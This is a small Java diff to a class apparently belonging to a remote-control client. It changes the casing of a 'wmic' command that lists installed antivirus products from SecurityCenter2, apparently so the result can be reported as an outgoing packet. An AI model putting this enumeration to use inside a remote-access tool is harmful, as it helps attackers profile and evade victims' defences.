@@ -15,7 +15,7 @@ public class Packet69Antivirus extends AbstractOutgoingPacket {
 		List<String> antiviruses = new ArrayList<String>();
 		
 		try {
-			Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/Node:localhost", "/Namespace:\\\\root\\SecurityCenter2", "Path", "AntiVirusProduct", "Get", "/Format:List" });
+			Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/node:localhost", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "/format:list" });
 			
 			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			
